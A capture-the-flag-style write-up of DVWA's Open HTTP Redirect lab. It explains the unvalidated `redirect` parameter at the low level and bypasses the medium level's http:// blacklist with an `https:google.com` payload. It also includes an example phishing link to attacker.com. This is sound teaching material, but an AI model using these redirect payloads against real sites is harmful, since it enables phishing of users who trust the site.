## Overview

Open Redirect is a vulnerability that occurs when a web application accepts an untrusted URL from user input and redirects users to that URL without proper validation.

An attacker can abuse this vulnerability to redirect users from a trusted website to a malicious website, which can be used for phishing attacks.

---

# Lab Environment

**Application:** DVWA

**Vulnerability:** Open HTTP Redirect

**Security Level:** Low / Medium

---

# 1. Low Level

## Source Code Analysis

The vulnerable code:

<img width="941" height="947" alt="image" src="https://github.com/user-attachments/assets/174310b0-771e-4513-8b99-efd58e480340" />


### Explanation

The application takes the value of the `redirect` parameter from the URL:

```
$_GET['redirect']
```

Then it directly uses it in:

```
header("location: " . $_GET['redirect']);
```

There is no validation to check whether the URL is trusted.

---

## Exploitation

First, we copy the Quote 1 link from the application.

<img width="947" height="972" alt="image" src="https://github.com/user-attachments/assets/bdc9bd80-bd8c-4b08-9dc9-d10fe34e51a4" />


Then, we modify the URL by adding the `redirect` parameter and set its value to an external URL.

http://127.0.0.1/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=https://google.com

After sending the modified URL, the application redirects the user to the provided external website, confirming the existence of the Open Redirect vulnerability.

### Result

The browser is redirected to:

```
https://google.com
```

---

## Impact

An attacker can create a malicious link that looks like it belongs to a trusted website:

```
https://trusted-site.com/login?redirect=https://attacker.com
```

A victim may trust the domain and click the link, then be redirected to a fake login page.

---

# 2. Medium Level

## Source Code Analysis

The application added a validation:

<img width="942" height="977" alt="image" src="https://github.com/user-attachments/assets/45fa36c0-4e32-4dd6-99d4-b17829dcbc56" />


---

## Explanation

The developer tries to block external URLs by searching for:

```
http://
```

or

```
https://
```

using `preg_match()`.

If found, the request is blocked.

Example:

```
redirect=https://google.com
```

Response:

```
Absolute URLs not allowed.
```

---

## Bypass

The validation only checks for the exact strings:

```
http://
https://
```

It does not validate the URL properly.

Payload:

```
http://127.0.0.1/DVWA/vulnerabilities/open_redirect/source/medium.php?redirect=https:google.com
```

---

## Why It Works

The filter searches for:

```
https://
```

but the payload contains:

```
https:google.com
```

There is no `//`, so the regex does not match.

The application then executes:

```
header("location: ".$_GET['redirect']);
```

and performs the redirect.

---

# Root Cause

The vulnerability exists because user-controlled input is used directly in the redirect function without proper validation.

The Medium protection failed because it relied on blacklist filtering instead of validating the destination.
